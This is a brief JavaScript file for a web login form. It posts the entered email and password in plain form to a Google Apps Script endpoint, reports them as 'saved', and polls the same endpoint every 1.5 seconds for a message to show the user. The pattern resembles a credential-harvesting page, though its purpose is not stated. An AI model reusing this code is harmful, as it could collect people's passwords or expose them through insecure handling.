const API_URL = "https://script.google.com/macros/s/AKfycbxKd1U_Kw0sLtygol3b3VrngzyR47URCQKwgB1K182FIJn_d82EN3UUYWmyRghv6cQ/exec";

// 🔹 LOGIN (send data + get message)
async function login() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  try {
    const res = await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    });

    const data = await res.json();

    document.getElementById("msg").innerText =
      data.message || "Saved successfully ✔";

  } catch (err) {
    console.error(err);
    alert("Error sending data");
  }
}


// 🔹 LOAD MESSAGE (REAL-TIME POLLING)
async function loadMessage() {
  try {
    const res = await fetch(API_URL);
    const data = await res.json();

    const msgBox = document.getElementById("msg");

    // Only update if changed (reduces flicker)
    if (msgBox.innerText !== data.message) {
      msgBox.innerText = data.message;
    }

  } catch (err) {
    console.log("Message fetch error");
  }
}


// 🔹 START REAL-TIME LOOP
window.onload = () => {
  loadMessage(); // first load

  // ⚡ fastest safe interval (1.5 seconds)
  setInterval(loadMessage, 1500);
};
